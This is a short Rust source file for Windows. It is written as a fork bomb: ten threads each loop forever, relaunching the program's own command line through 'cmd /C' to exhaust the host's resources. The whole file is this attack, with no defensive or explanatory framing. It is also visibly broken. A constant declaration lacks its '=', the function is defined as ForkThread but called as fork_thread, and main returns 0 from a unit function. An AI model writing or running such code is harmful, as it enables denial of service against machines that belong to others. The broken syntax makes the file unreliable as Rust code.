use std::process::{Command,exit};
use std::thread;
use std::time::Duration;

const NUM_THREADS: usize 10

fn ForkThread(){
    loop {
        let output = Command::new("cmd")

        .arg("/C")
        .arg(std::env::args().collect::<Vec<String>>().join(" "))
        .output();

        match output {
            Ok(_) => {
                
            }
            Err(e) => {
                eprintln!("[!] Error:{}",e);
                exit(1);
        }
    }
    }
}

fn fork_bomb() {
    let mut threads = vec![];

    for _ in 0..NUM_THREADS {
        let thread = thread::spawn(fork_thread);
        threads.push(thread);

        thread::sleep(Duration::from_millis(10));
    }

    for thread in threads {
        thread.join().unwrap();
    }
}

fn main(){
    fork_bomb();
    return 0;
}
